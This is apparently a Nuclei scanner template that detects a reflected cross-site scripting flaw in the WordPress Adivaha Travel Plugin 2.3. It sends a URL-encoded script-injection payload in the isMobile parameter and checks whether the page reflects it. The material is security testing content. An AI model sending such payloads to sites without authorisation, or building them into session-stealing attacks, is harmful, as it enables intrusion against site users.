http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains_all(body, "<script>alert(document.domain)</script>", "travelpayout_flight")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/mobile-app/v3/?pid=77A89299&isMobile=%20clq95%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Elb1ra'
id: wp-adivaha-xss
info:
  author: r3Y3r53
  description: 'The attacker can send to victim a link containing a malicious URL
    in an email or instant message can perform a wide variety of actions, such as
    stealing the victim''s session token or login credentials

    '
  metadata:
    max-request: 1
    verified: true
  name: WordPress Adivaha Travel Plugin 2.3 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/51663
  severity: medium
  tags: wordpress,wp,wp-plugin,xss,adivaha,travel,vuln
